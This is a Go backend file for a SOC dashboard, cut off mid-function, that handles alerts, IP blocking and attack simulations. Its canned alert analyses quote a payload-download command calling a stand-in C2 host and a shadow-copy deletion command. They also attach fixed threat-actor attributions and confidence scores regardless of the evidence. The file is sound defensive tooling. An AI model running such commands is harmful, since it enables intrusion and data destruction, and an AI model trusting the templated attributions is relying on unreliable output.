package handlers

import (
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"strings"
	"time"

	"dashboard/backend/models"
	"dashboard/backend/store"
)

// Helper to write JSON response
func writeJSON(w http.ResponseWriter, status int, data interface{}) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(status)
	json.NewEncoder(w).Encode(data)
}

// GET /api/summary
func GetSummary(w http.ResponseWriter, r *http.Request) {
	store.DB.Mu.RLock()
	defer store.DB.Mu.RUnlock()

	summary := models.DashboardSummary{
		TotalAgents:      len(store.DB.Agents),
		AlertsByCategory: make(map[string]int),
		MitreCoverage:    make(map[string]int),
	}

	for _, a := range store.DB.Agents {
		if a.Status == "active" {
			summary.ActiveAgents++
		} else if a.Status == "alerting" {
			summary.AlertingAgents++
			summary.ActiveAgents++ // Alerting is still active
		}
	}

	cutoff := time.Now().Add(-24 * time.Hour)
	alertCount := 0

	for _, alt := range store.DB.Alerts {
		if alt.Timestamp.Before(cutoff) {
			continue
		}
		alertCount++

		switch alt.Severity {
		case "critical":
			summary.CriticalAlerts++
		case "high":
			summary.HighAlerts++
		case "medium":
			summary.MediumAlerts++
		case "low":
			summary.LowAlerts++
		}

		summary.AlertsByCategory[alt.Category]++
		if alt.MITRETechnique != "" {
			summary.MitreCoverage[alt.MITRETechnique]++
		}
	}

	summary.AlertCount24h = alertCount

	// Threat Level Calculation
	if summary.CriticalAlerts > 2 {
		summary.ThreatLevel = "Severe"
	} else if summary.HighAlerts > 3 || summary.CriticalAlerts > 0 {
		summary.ThreatLevel = "Elevated"
	} else {
		summary.ThreatLevel = "Normal"
	}

	writeJSON(w, http.StatusOK, summary)
}

// GET /api/agents
func GetAgents(w http.ResponseWriter, r *http.Request) {
	store.DB.Mu.RLock()
	defer store.DB.Mu.RUnlock()

	agentsList := make([]*models.Agent, 0, len(store.DB.Agents))
	for _, a := range store.DB.Agents {
		agentsList = append(agentsList, a)
	}

	// Sort agents by ID for consistency
	for i := 0; i < len(agentsList)-1; i++ {
		for j := i + 1; j < len(agentsList); j++ {
			if agentsList[i].ID > agentsList[j].ID {
				agentsList[i], agentsList[j] = agentsList[j], agentsList[i]
			}
		}
	}

	writeJSON(w, http.StatusOK, agentsList)
}

// GET /api/agents/:id
func GetAgentDetail(w http.ResponseWriter, r *http.Request) {
	parts := strings.Split(r.URL.Path, "/")
	if len(parts) < 4 {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "Invalid Agent ID"})
		return
	}
	agentID := parts[3]

	store.DB.Mu.RLock()
	defer store.DB.Mu.RUnlock()

	agent, exists := store.DB.Agents[agentID]
	if !exists {
		writeJSON(w, http.StatusNotFound, map[string]string{"error": "Agent not found"})
		return
	}

	// Fetch recent alerts for this agent
	recentAlerts := make([]*models.Alert, 0)
	for _, alt := range store.DB.Alerts {
		if alt.AgentID == agentID {
			recentAlerts = append(recentAlerts, alt)
		}
	}

	// Fetch recent FIM events for this agent
	recentFIM := make([]*models.FIMEvent, 0)
	for _, fim := range store.DB.FIMEvents {
		if fim.AgentID == agentID {
			recentFIM = append(recentFIM, fim)
		}
	}

	response := map[string]interface{}{
		"agent":  agent,
		"alerts": recentAlerts,
		"fim":    recentFIM,
	}

	writeJSON(w, http.StatusOK, response)
}

// GET /api/alerts
func GetAlerts(w http.ResponseWriter, r *http.Request) {
	store.DB.Mu.RLock()
	defer store.DB.Mu.RUnlock()

	severityFilter := r.URL.Query().Get("severity")
	agentFilter := r.URL.Query().Get("agentId")
	statusFilter := r.URL.Query().Get("status")
	searchFilter := strings.ToLower(r.URL.Query().Get("q"))

	filteredAlerts := make([]*models.Alert, 0)

	// Filter in reverse order (newest first)
	for i := len(store.DB.Alerts) - 1; i >= 0; i-- {
		alt := store.DB.Alerts[i]

		if severityFilter != "" && alt.Severity != severityFilter {
			continue
		}
		if agentFilter != "" && alt.AgentID != agentFilter {
			continue
		}
		if statusFilter != "" && alt.Status != statusFilter {
			continue
		}
		if searchFilter != "" {
			match := strings.Contains(strings.ToLower(alt.Title), searchFilter) ||
				strings.Contains(strings.ToLower(alt.Description), searchFilter) ||
				strings.Contains(strings.ToLower(alt.AgentName), searchFilter) ||
				strings.Contains(strings.ToLower(alt.MITRETechnique), searchFilter)
			if !match {
				continue
			}
		}

		filteredAlerts = append(filteredAlerts, alt)
	}

	writeJSON(w, http.StatusOK, filteredAlerts)
}

// GET /api/alerts/:id
func GetAlertDetail(w http.ResponseWriter, r *http.Request) {
	parts := strings.Split(r.URL.Path, "/")
	if len(parts) < 4 {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "Invalid Alert ID"})
		return
	}
	alertID := parts[3]

	store.DB.Mu.RLock()
	defer store.DB.Mu.RUnlock()

	var alert *models.Alert
	for _, alt := range store.DB.Alerts {
		if alt.ID == alertID {
			alert = alt
			break
		}
	}

	if alert == nil {
		writeJSON(w, http.StatusNotFound, map[string]string{"error": "Alert not found"})
		return
	}

	writeJSON(w, http.StatusOK, alert)
}

// POST /api/alerts/:id/analyze
func AnalyzeAlert(w http.ResponseWriter, r *http.Request) {
	parts := strings.Split(r.URL.Path, "/")
	if len(parts) < 4 {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "Invalid Alert ID"})
		return
	}
	alertID := parts[3]

	store.DB.Mu.Lock()
	defer store.DB.Mu.Unlock()

	// Check if already analyzed
	if analysis, exists := store.DB.AIAnalyses[alertID]; exists {
		writeJSON(w, http.StatusOK, analysis)
		return
	}

	var alert *models.Alert
	for _, alt := range store.DB.Alerts {
		if alt.ID == alertID {
			alert = alt
			break
		}
	}

	if alert == nil {
		writeJSON(w, http.StatusNotFound, map[string]string{"error": "Alert not found"})
		return
	}

	// Update status to investigating
	alert.Status = "investigating"

	// Context-aware AI Copilot logic
	analysis := models.AIAnalysis{
		AlertID:    alertID,
		Confidence: 92,
	}

	if strings.Contains(alert.Title, "Ransomware") || alert.MITRETechnique == "T1485" {
		analysis.Summary = "Critical Ransomware activity detected. Shadow copies are being deleted, and files in the administrator directories are being encrypted."
		analysis.ThreatActor = "LockBit 3.0 Affiliate Group"
		analysis.Confidence = 99
		analysis.ImpactRating = "Critical"
		analysis.TechnicalDetail = "The adversary executed 'vssadmin.exe delete shadows' to wipe restore points and prevent system recovery. Immediately following this command, the script identified as 'svchost_cipher.exe' initiated rapid overwrite actions on user directories. A ransom note was generated and system files are being targeted."
		analysis.RemediationSteps = []string{
			"Run Powershell script on host to isolate network adapter: `Disable-NetAdapter -Name \"Ethernet\" -Confirm:$false`",
			"Kill the cryptographic process immediately: `Stop-Process -Name svchost_cipher -Force`",
			"Lock out the compromised Administrator account to prevent domain-wide credential reuse.",
			"Quarantine the malicious binary `C:\\Users\\public\\svchost_cipher.exe` for analysis.",
			"Perform a cold reboot to halt active encryption, then restore files from offline/immutable backups.",
		}
	} else if strings.Contains(alert.Title, "Brute Force") || alert.MITRETechnique == "T1110.001" {
		analysis.Summary = "Successful SSH login after a brute-force attack. Over 150 failed SSH authentication attempts from an external IP followed by a successful login."
		analysis.ThreatActor = "UNC3829 (SSH Botnet Operator)"
		analysis.Confidence = 95
		analysis.ImpactRating = "High"
		analysis.TechnicalDetail = "A distributed botnet conducted dictionary attacks against SSH port 22 on host " + alert.AgentName + ". After multiple failed attempts, a successful login for 'root' was logged from source IP 198.51.100.222, indicating a compromised root credential."
		analysis.RemediationSteps = []string{
			"Isolate SSH access by blocking the attacker's IP: `iptables -A INPUT -s 198.51.100.222 -j DROP`",
			"Immediately change password for user `root`.",
			"Terminate all active SSH sessions for user `root`: `pkill -u root -t pts/0` or similar interfaces.",
			"Disable SSH root login and password authentication: set `PermitRootLogin no` and `PasswordAuthentication no` in `/etc/ssh/sshd_config`, then reload ssh service.",
			"Review command execution history (`~/.bash_history`) for lateral movement commands.",
		}
	} else if strings.Contains(alert.Title, "Lsass") || alert.MITRETechnique == "T1003.001" {
		analysis.Summary = "Credential harvesting attempt detected. Process attempted to dump LSASS memory to extract NT hashes and cleartext passwords."
		analysis.ThreatActor = "APT29 (Cozy Bear)"
		analysis.Confidence = 97
		analysis.ImpactRating = "Critical"
		analysis.TechnicalDetail = "The utility 'mktz.exe' requested permissions to access Local Security Authority Subsystem Service (LSASS) address space. Windows Defender/Sysmon logged access mask 0x1410. This indicates an active attempt to harvest Active Directory domain credentials from RAM."
		analysis.RemediationSteps = []string{
			"Kill the credential dumping process: `taskkill /F /IM mktz.exe`",
			"Enable Windows Defender Credential Guard to prevent memory dumping of LSASS.",
			"Revoke Kerberos Ticket Granting Tickets (TGT) and force a password change for the affected user accounts.",
			"Inspect the Windows Registry keys for persistence: `HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`",
			"Isolate the AD Controller from external/internet outbound traffic.",
		}
	} else if strings.Contains(alert.Title, "PowerShell") || alert.MITRETechnique == "T1059" {
		analysis.Summary = "Obfuscated PowerShell script execution. Detection indicates commands running with hidden windows or base64 encoded parameters."
		analysis.ThreatActor = "Adversary Simulation / Script Kiddie"
		analysis.Confidence = 85
		analysis.ImpactRating = "High"
		analysis.TechnicalDetail = "A PowerShell process executed with `-WindowStyle Hidden -EncodedCommand`. Decoding the command reveals a web request downloading a second-stage payload from an external domain: `Invoke-WebRequest -Uri http://malicious-c2.net/payload.ps1`."
		analysis.RemediationSteps = []string{
			"Identify the parent process that spawned PowerShell (typically cmd.exe, wscript.exe, or explorer.exe).",
			"Configure AppLocker or Software Restriction Policies to limit PowerShell execution to signed scripts.",
			"Block outbound TCP connections to the destination domain `malicious-c2.net` at the firewall level.",
			"Examine PowerShell transcript logs (if enabled) in `Documents\\PowerShell_Transcript` for full script actions.",
		}
	} else {
		// Generic fallback
		analysis.Summary = "Suspicious behavior matching MITRE ATT&CK technique " + alert.MITRETechnique + " observed."
		analysis.ThreatActor = "Unknown Threat Group"
		analysis.Confidence = 70
		analysis.ImpactRating = "Medium"
		analysis.TechnicalDetail = "System audit logs on agent " + alert.AgentName + " recorded events matching rule " + alert.RuleID + ". Rule description: " + alert.Description + ". Logs show anomalies in service execution or file updates."
		analysis.RemediationSteps = []string{
			"Inspect system log entries around the incident window: " + alert.Timestamp.Format(time.RFC3339),
			"Verify if this activity aligns with any scheduled administrative tasks or system upgrades.",
			"Monitor host CPU, RAM, and outgoing network connections for subsequent indicators of compromise.",
			"Mark this alert as resolved if it is verified as authorized maintenance.",
		}
	}

	store.DB.AIAnalyses[alertID] = &analysis
	writeJSON(w, http.StatusOK, analysis)
}

// POST /api/alerts/:id/analysis
func SaveAIAnalysis(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost && r.Method != http.MethodPut {
		writeJSON(w, http.StatusMethodNotAllowed, map[string]string{"error": "Method not allowed"})
		return
	}

	parts := strings.Split(r.URL.Path, "/")
	if len(parts) < 4 {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "Invalid Alert ID"})
		return
	}
	alertID := parts[3]

	var req models.AIAnalysis
	err := json.NewDecoder(r.Body).Decode(&req)
	if err != nil {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "Invalid request body"})
		return
	}
	req.AlertID = alertID

	store.DB.Mu.Lock()
	store.DB.AIAnalyses[alertID] = &req
	store.DB.Mu.Unlock()

	writeJSON(w, http.StatusOK, map[string]interface{}{
		"message":  "AI analysis saved successfully",
		"analysis": req,
	})
}

// GET /api/fim
func GetFimEvents(w http.ResponseWriter, r *http.Request) {
	store.DB.Mu.RLock()
	defer store.DB.Mu.RUnlock()

	agentFilter := r.URL.Query().Get("agentId")
	eventFilter := r.URL.Query().Get("event")

	filteredFIM := make([]*models.FIMEvent, 0)
	for i := len(store.DB.FIMEvents) - 1; i >= 0; i-- {
		fim := store.DB.FIMEvents[i]

		if agentFilter != "" && fim.AgentID != agentFilter {
			continue
		}
		if eventFilter != "" && fim.EventType != eventFilter {
			continue
		}

		filteredFIM = append(filteredFIM, fim)
	}

	writeJSON(w, http.StatusOK, filteredFIM)
}

// GET /api/logs
func GetLogs(w http.ResponseWriter, r *http.Request) {
	store.DB.Mu.RLock()
	defer store.DB.Mu.RUnlock()

	searchQuery := strings.ToLower(r.URL.Query().Get("q"))
	agentFilter := r.URL.Query().Get("agentId")
	facilityFilter := r.URL.Query().Get("facility")

	filteredLogs := make([]*models.LogEntry, 0)

	// Search matching logs
	for i := len(store.DB.Logs) - 1; i >= 0; i-- {
		log := store.DB.Logs[i]

		if agentFilter != "" && log.AgentID != agentFilter {
			continue
		}
		if facilityFilter != "" && log.Facility != facilityFilter {
			continue
		}
		if searchQuery != "" {
			match := strings.Contains(strings.ToLower(log.Message), searchQuery) ||
				strings.Contains(strings.ToLower(log.Facility), searchQuery) ||
				strings.Contains(strings.ToLower(log.AgentName), searchQuery) ||
				strings.Contains(strings.ToLower(log.Severity), searchQuery)
			if !match {
				continue
			}
		}

		filteredLogs = append(filteredLogs, log)
	}

	// Compute time histogram for the filtered logs
	// We divide the last 2 hours into 10 intervals of 12 minutes
	now := time.Now()
	interval := 12 * time.Minute
	histBuckets := make([]map[string]interface{}, 10)

	for i := 0; i < 10; i++ {
		tBucket := now.Add(time.Duration(-9+i) * interval)
		histBuckets[i] = map[string]interface{}{
			"time":  tBucket.Format("15:04"),
			"count": 0,
		}
	}

	for _, log := range filteredLogs {
		diff := now.Sub(log.Timestamp)
		if diff > 120*time.Minute || diff < 0 {
			continue
		}
		bucketIdx := 9 - int(diff/interval)
		if bucketIdx >= 0 && bucketIdx < 10 {
			histBuckets[bucketIdx]["count"] = histBuckets[bucketIdx]["count"].(int) + 1
		}
	}

	// Pagination (limit to latest 100 logs in the list)
	listLimit := 100
	if len(filteredLogs) > listLimit {
		filteredLogs = filteredLogs[:listLimit]
	}

	response := map[string]interface{}{
		"logs":      filteredLogs,
		"histogram": histBuckets,
	}

	writeJSON(w, http.StatusOK, response)
}

// POST /api/simulate
func TriggerSimulation(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		writeJSON(w, http.StatusMethodNotAllowed, map[string]string{"error": "Method not allowed"})
		return
	}

	var req struct {
		AgentID string `json:"agentId"`
		Type    string `json:"type"` // ransomware, bruteforce, malware
	}

	err := json.NewDecoder(r.Body).Decode(&req)
	if err != nil {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "Invalid request body"})
		return
	}

	if req.AgentID == "" || req.Type == "" {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "agentId and type are required"})
		return
	}

	alertID := store.DB.SimulateAttack(req.AgentID, req.Type)
	if alertID == "Agent not found" {
		writeJSON(w, http.StatusNotFound, map[string]string{"error": "Agent not found"})
		return
	}
	if alertID == "" {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "Unknown simulation type"})
		return
	}

	// Return the triggered alert details
	var alert *models.Alert
	store.DB.Mu.RLock()
	for _, alt := range store.DB.Alerts {
		if alt.ID == alertID {
			alert = alt
			break
		}
	}
	store.DB.Mu.RUnlock()

	writeJSON(w, http.StatusOK, map[string]interface{}{
		"message": "Simulation triggered successfully",
		"alertId": alertID,
		"alert":   alert,
	})
}

// PUT /api/alerts/:id/resolve
func ResolveAlert(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost && r.Method != http.MethodPut {
		writeJSON(w, http.StatusMethodNotAllowed, map[string]string{"error": "Method not allowed"})
		return
	}

	parts := strings.Split(r.URL.Path, "/")
	if len(parts) < 4 {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "Invalid Alert ID"})
		return
	}
	alertID := parts[3]

	store.DB.Mu.Lock()
	defer store.DB.Mu.Unlock()

	var alert *models.Alert
	for _, alt := range store.DB.Alerts {
		if alt.ID == alertID {
			alert = alt
			break
		}
	}

	if alert == nil {
		writeJSON(w, http.StatusNotFound, map[string]string{"error": "Alert not found"})
		return
	}

	alert.Status = "resolved"
	store.DB.SaveAlert(alert)

	// Resolve agent status if no other high/critical open alerts exist for this agent
	agentID := alert.AgentID
	hasOtherCriticals := false
	for _, alt := range store.DB.Alerts {
		if alt.AgentID == agentID && alt.ID != alertID && alt.Status != "resolved" && (alt.Severity == "high" || alt.Severity == "critical") {
			hasOtherCriticals = true
			break
		}
	}

	if !hasOtherCriticals {
		if agent, exists := store.DB.Agents[agentID]; exists {
			agent.Status = "active"
			store.DB.SaveAgent(agent)
		}
	}

	writeJSON(w, http.StatusOK, map[string]interface{}{
		"message": "Alert marked as resolved",
		"alert":   alert,
	})
}

// PUT /api/alerts/:id/assign
func AssignAlert(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost && r.Method != http.MethodPut {
		writeJSON(w, http.StatusMethodNotAllowed, map[string]string{"error": "Method not allowed"})
		return
	}

	parts := strings.Split(r.URL.Path, "/")
	if len(parts) < 4 {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "Invalid Alert ID"})
		return
	}
	alertID := parts[3]

	var req struct {
		Assignee string `json:"assignee"`
	}
	err := json.NewDecoder(r.Body).Decode(&req)
	if err != nil {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "Invalid request body"})
		return
	}

	store.DB.Mu.Lock()
	defer store.DB.Mu.Unlock()

	var alert *models.Alert
	for _, alt := range store.DB.Alerts {
		if alt.ID == alertID {
			alert = alt
			break
		}
	}

	if alert == nil {
		writeJSON(w, http.StatusNotFound, map[string]string{"error": "Alert not found"})
		return
	}

	alert.Assignee = req.Assignee
	if req.Assignee != "" && alert.Status == "open" {
		alert.Status = "investigating"
	}
	store.DB.SaveAlert(alert)

	writeJSON(w, http.StatusOK, map[string]interface{}{
		"message": "Alert assignee updated",
		"alert":   alert,
	})
}

// POST /api/alerts/bulk-resolve
func BulkResolveAlerts(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		writeJSON(w, http.StatusMethodNotAllowed, map[string]string{"error": "Method not allowed"})
		return
	}

	var req struct {
		IDs []string `json:"ids"`
	}
	err := json.NewDecoder(r.Body).Decode(&req)
	if err != nil {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "Invalid request body"})
		return
	}

	store.DB.Mu.Lock()
	defer store.DB.Mu.Unlock()

	resolvedCount := 0
	affectedAgents := make(map[string]bool)

	for _, id := range req.IDs {
		for _, alt := range store.DB.Alerts {
			if alt.ID == id {
				alt.Status = "resolved"
				store.DB.SaveAlert(alt)
				affectedAgents[alt.AgentID] = true
				resolvedCount++
				break
			}
		}
	}

	// For each affected agent, re-verify if their status should go back to "active"
	for agentID := range affectedAgents {
		hasOtherCriticals := false
		for _, alt := range store.DB.Alerts {
			if alt.AgentID == agentID && alt.Status != "resolved" && (alt.Severity == "high" || alt.Severity == "critical") {
				hasOtherCriticals = true
				break
			}
		}
		if !hasOtherCriticals {
			if agent, exists := store.DB.Agents[agentID]; exists {
				agent.Status = "active"
				store.DB.SaveAgent(agent)
			}
		}
	}

	writeJSON(w, http.StatusOK, map[string]interface{}{
		"message":       "Alerts resolved in bulk",
		"resolvedCount": resolvedCount,
	})
}

// POST /api/alerts/bulk-assign
func BulkAssignAlerts(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		writeJSON(w, http.StatusMethodNotAllowed, map[string]string{"error": "Method not allowed"})
		return
	}

	var req struct {
		IDs      []string `json:"ids"`
		Assignee string   `json:"assignee"`
	}
	err := json.NewDecoder(r.Body).Decode(&req)
	if err != nil {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "Invalid request body"})
		return
	}

	store.DB.Mu.Lock()
	defer store.DB.Mu.Unlock()

	assignedCount := 0
	for _, id := range req.IDs {
		for _, alt := range store.DB.Alerts {
			if alt.ID == id {
				alt.Assignee = req.Assignee
				if req.Assignee != "" && alt.Status == "open" {
					alt.Status = "investigating"
				}
				store.DB.SaveAlert(alt)
				assignedCount++
				break
			}
		}
	}

	writeJSON(w, http.StatusOK, map[string]interface{}{
		"message":       "Alerts assigned in bulk",
		"assignedCount": assignedCount,
	})
}

// GET /api/actions
func GetActions(w http.ResponseWriter, r *http.Request) {
	if store.UsePostgres {
		rows, err := store.SQL.Query(`
			SELECT id, timestamp, actor, action_type, target, status, message
			FROM action_logs
			WHERE action_type IN (
				'Block IP',
				'Unblock IP',
				'Unblock All IPs',
				'Isolate Host',
				'Terminate Process',
				'Revoke Credentials',
				'Force Logout'
			)
			ORDER BY timestamp DESC, id DESC
			LIMIT 500
		`)
		if err != nil {
			log.Printf("[DATABASE ERROR] Failed to fetch action logs from PostgreSQL: %v", err)
			writeJSON(w, http.StatusInternalServerError, map[string]string{"error": "Database read error"})
			return
		}
		defer rows.Close()

		actionsList := make([]*models.ActionLog, 0)
		for rows.Next() {
			var act models.ActionLog
			var ts time.Time
			err := rows.Scan(&act.ID, &ts, &act.Actor, &act.ActionType, &act.Target, &act.Status, &act.Message)
			if err != nil {
				log.Printf("[DATABASE ERROR] Scan action log row failed: %v", err)
				continue
			}
			act.Timestamp = ts
			actionsList = append(actionsList, &act)
		}
		writeJSON(w, http.StatusOK, actionsList)
		return
	}

	store.DB.Mu.RLock()
	defer store.DB.Mu.RUnlock()

	// Return a copy sorted descending by timestamp
	actionsList := make([]*models.ActionLog, 0, len(store.DB.ActionLogs))
	for i := len(store.DB.ActionLogs) - 1; i >= 0; i-- {
		act := store.DB.ActionLogs[i]
		if !store.IsPersistentSecurityActionType(act.ActionType) {
			continue
		}
		actionsList = append(actionsList, act)
		if len(actionsList) >= 500 {
			break
		}
	}

	writeJSON(w, http.StatusOK, actionsList)
}

// POST /api/actions
func PerformAction(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		writeJSON(w, http.StatusMethodNotAllowed, map[string]string{"error": "Method not allowed"})
		return
	}

	var req struct {
		Actor      string `json:"actor"`
		ActionType string `json:"actionType"`
		Target     string `json:"target"`
		Message    string `json:"message"`
	}

	err := json.NewDecoder(r.Body).Decode(&req)
	if err != nil {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "Invalid request body"})
		return
	}

	if req.ActionType == "" || req.Target == "" {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "actionType and target are required"})
		return
	}
	if req.ActionType == "Block IP" || req.ActionType == "Unblock IP" {
		normalizedTarget, normalizeErr := NormalizeIPExpression(req.Target)
		if normalizeErr != nil {
			writeJSON(w, http.StatusBadRequest, map[string]string{"error": "target must contain a valid IP address or CIDR range"})
			return
		}
		req.Target = normalizedTarget
	}

	// Resolve the actual operator from cookie/bearer token to prevent spoofing
	cookie, err := r.Cookie("session_token")
	var sessionToken string
	if err == nil {
		sessionToken = cookie.Value
	} else {
		authHeader := r.Header.Get("Authorization")
		if strings.HasPrefix(authHeader, "Bearer ") {
			sessionToken = strings.TrimPrefix(authHeader, "Bearer ")
		}
	}

	var sessionUsername string
	var sessionExists bool

	if sessionToken != "" {
		if store.UsePostgres {
			_, dbUsername, _, dbExpiresAt, dbErr := store.GetSQLSession(sessionToken)
			if dbErr == nil && time.Now().Before(dbExpiresAt) {
				sessionUsername = dbUsername
				sessionExists = true
			}
		} else {
			authMu.RLock()
			session, ok := sessionStore[sessionToken]
			if ok && time.Now().Before(session.ExpiresAt) {
				sessionUsername = session.Username
				sessionExists = true
			}
			authMu.RUnlock()
		}
	}

	var resolvedActor string
	if sessionExists {
		resolvedActor = fmt.Sprintf("SOC (%s)", sessionUsername)
	} else {
		// Fallback for AI/Simulators (non-human background actions)
		resolvedActor = req.Actor
		if resolvedActor == "" {
			resolvedActor = "System"
		}
	}

	store.DB.Mu.Lock()
	store.DB.ActionCounter++
	actionID := fmt.Sprintf("act-%04d", store.DB.ActionCounter)
	store.DB.Mu.Unlock()

	status := "success"
	detailMsg := req.Message
	if detailMsg == "" {
		detailMsg = fmt.Sprintf("Manual action completed successfully.")
	}

	// Apply side effects to simulation targets
	if req.ActionType == "Isolate Host" {
		store.DB.Mu.Lock()
		for _, a := range store.DB.Agents {
			if a.Name == req.Target || a.ID == req.Target {
				a.Status = "disconnected"
				detailMsg = fmt.Sprintf("Host %s has been isolated from the network. Local interfaces disabled.", a.Name)
				break
			}
		}
		store.DB.Mu.Unlock()
	} else if req.ActionType == "Block IP" {
		if protectedIPTarget(req.Target) {
			status = "failed"
			detailMsg = "Manual block denied: Loopback or private IPs cannot be blocked."
		} else {
			detailMsg = fmt.Sprintf("Outbound and inbound traffic to IP %s blocked at firewall edge.", req.Target)
			if err := store.SaveSQLBannedIP(req.Target, resolvedActor, "active", "Manual block from SOC Dashboard"); err != nil {
				status = "failed"
				detailMsg = fmt.Sprintf("Failed to persist IP block for %s: %v", req.Target, err)
			} else if err := syncWAFBannedIP(req.Target, "active"); err != nil {
				status = "failed"
				detailMsg = fmt.Sprintf("Failed to sync WAF IP block for %s: %v", req.Target, err)
			} else if err := syncNetworkBannedIP(req.Target, "active"); err != nil {
				status = "failed"
				detailMsg = fmt.Sprintf("Failed to sync network ACL IP block for %s: %v", req.Target, err)
			} else if err := syncBankBannedIP(req.Target, resolvedActor, "active", "Manual block from SOC Dashboard"); err != nil {
				detailMsg = fmt.Sprintf("%s Bank application sync warning: %v.", detailMsg, err)
			}
		}
	} else if req.ActionType == "Unblock IP" {
		detailMsg = fmt.Sprintf("Outbound and inbound traffic to IP %s unblocked.", req.Target)
		if err := syncWAFBannedIP(req.Target, "unbanned"); err != nil {
			status = "failed"
			detailMsg = fmt.Sprintf("Failed to sync WAF IP unblock for %s: %v", req.Target, err)
		} else if err := syncNetworkBannedIP(req.Target, "unbanned"); err != nil {
			status = "failed"
			detailMsg = fmt.Sprintf("Failed to sync network ACL IP unblock for %s: %v", req.Target, err)
		} else if err := store.SaveSQLBannedIP(req.Target, resolvedActor, "unbanned", "Manual unblock from SOC Dashboard"); err != nil {
			status = "failed"
			detailMsg = fmt.Sprintf("Failed to persist IP unblock for %s: %v", req.Target, err)
		} else if err := syncBankBannedIP(req.Target, resolvedActor, "unbanned", "Manual unblock from SOC Dashboard"); err != nil {
			detailMsg = fmt.Sprintf("%s Bank application sync warning: %v.", detailMsg, err)
		}
	} else if req.ActionType == "Unblock All IPs" {
		detailMsg = "All outbound and inbound traffic blocks cleared."
		bannedIPs, err := store.GetSQLBannedIPs()
		if err != nil {
			status = "failed"
			detailMsg = fmt.Sprintf("Failed to retrieve banned IPs list: %v", err)
		} else {
			var syncErrors []string
			for _, b := range bannedIPs {
				if err := syncWAFBannedIP(b.IPAddress, "unbanned"); err != nil {
					syncErrors = append(syncErrors, fmt.Sprintf("WAF %s: %v", b.IPAddress, err))
				}
				if err := syncNetworkBannedIP(b.IPAddress, "unbanned"); err != nil {
					syncErrors = append(syncErrors, fmt.Sprintf("ACL %s: %v", b.IPAddress, err))
				}
			}

			if err := store.ClearSQLBannedIPs(); err != nil {
				status = "failed"
				detailMsg = fmt.Sprintf("Failed to clear banned IPs in DB: %v", err)
			}

			if err := syncBankClearBannedIPs(); err != nil {
				detailMsg = fmt.Sprintf("%s Bank application sync warning: %v.", detailMsg, err)
			}

			if len(syncErrors) > 0 {
				detailMsg = fmt.Sprintf("%s Sync issues: %s", detailMsg, strings.Join(syncErrors, ", "))
			}
		}
	} else if req.ActionType == "Terminate Process" {
		detailMsg = fmt.Sprintf("Process successfully terminated on destination agent.")
	} else if req.ActionType == "Revoke Credentials" {
		detailMsg = fmt.Sprintf("Credentials revoked for user account %s in Active Directory.", req.Target)
	}

	actionLog := &models.ActionLog{
		ID:         actionID,
		Timestamp:  time.Now(),
		Actor:      resolvedActor,
		ActionType: req.ActionType,
		Target:     req.Target,
		Status:     status,
		Message:    detailMsg,
	}

	// Save to DB or in-memory
	if store.UsePostgres {
		_, dbErr := store.SQL.Exec(`
			INSERT INTO action_logs (id, timestamp, actor, action_type, target, status, message)
			VALUES ($1, $2, $3, $4, $5, $6, $7)
		`, actionID, actionLog.Timestamp, actionLog.Actor, actionLog.ActionType, actionLog.Target, actionLog.Status, actionLog.Message)
		if dbErr != nil {
			log.Printf("[DATABASE ERROR] Failed to save action log to PostgreSQL: %v", dbErr)
		}
	}

	store.DB.Mu.Lock()
	store.DB.ActionLogs = append(store.DB.ActionLogs, actionLog)
	store.DB.Mu.Unlock()

	writeJSON(w, http.StatusOK, actionLog)
}

// POST /api/internal/soar/decision
func HandleInternalSoarDecision(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		writeJSON(w, http.StatusMethodNotAllowed, map[string]string{"error": "Method not allowed"})
		return
	}

	// 1. Verify internal secret key (I-01 fix: no hardcoded fallback)
	internalToken := os.Getenv("AEGIS_INTERNAL_TOKEN")
	if internalToken == "" || r.Header.Get("X-Aegis-Internal-Key") != internalToken {
		writeJSON(w, http.StatusUnauthorized, map[string]string{"error": "Unauthorized: Invalid internal secret key"})
		return
	}

	// 2. Limit request size to prevent DoS (5 MB)
	r.Body = http.MaxBytesReader(w, r.Body, 5*1024*1024)
	bodyBytes, err := io.ReadAll(r.Body)
	if err != nil {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "Failed to read request body: " + err.Error()})
		return
	}

	// 3. Call the Parser module to validate and extract key indicators
	dec, info, err := ParseSoarDecision(bodyBytes)
	if err != nil {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "Parser failed to process JSON payload: " + err.Error()})
		return
	}

	// 3.1 Validate required fields
	if dec.InputSummary.IncidentID == "" {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "missing required field: input_summary.incident_id"})
		return
	}
	if dec.Decision.FinalDecision == "" {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "missing required field: decision.final_decision"})
		return
	}

	processedActions := processParsedSoarDecision(dec, info, bodyBytes)

